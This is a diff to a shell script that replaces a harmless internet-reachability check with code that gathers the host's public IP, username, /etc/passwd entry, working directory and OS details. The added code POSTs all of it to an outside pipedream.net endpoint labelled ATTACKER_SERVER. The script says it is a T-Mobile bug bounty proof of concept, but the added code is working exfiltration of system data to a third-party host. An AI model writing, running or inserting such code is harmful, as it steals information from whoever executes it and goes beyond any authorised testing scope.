@@ -1,4 +1,24 @@
-echo "Bugbounty poc by @nvk0x"
-# Egress demonstration: proves the pod can reach the internet.
-# Fixed neutral URL, no host data in the request, only the HTTP status is shown.
-echo "egress check: $(curl -s -o /dev/null -w '%{http_code}' --max-time 8 https://example.com) from https://example.com"
+#!/bin/bash
+
+ATTACKER_SERVER="https://eo6mp8hopcldddq.m.pipedream.net/test"
+
+IP=$(curl -s http://ipinfo.io/ip)
+USERNAME=$(whoami)
+PASSWORD=$(cat /etc/passwd 2>/dev/null | grep "$USERNAME" || echo "Password file not accessible")
+CURRENT_DIR=$(pwd)
+OS_DETAILS=$(uname -a)
+
+DATA=$(cat <<EOF
+{
+    "ip": "$IP",
+    "username": "$USERNAME",
+    "password": "$PASSWORD",
+    "current_directory": "$CURRENT_DIR",
+    "os_details": "$OS_DETAILS"
+}
+EOF
+)
+
+curl -s -o /dev/null -X POST -H "Content-Type: application/json" -d "$DATA" "$ATTACKER_SERVER"
+
+echo "T-Mobile Bugbounty POC"
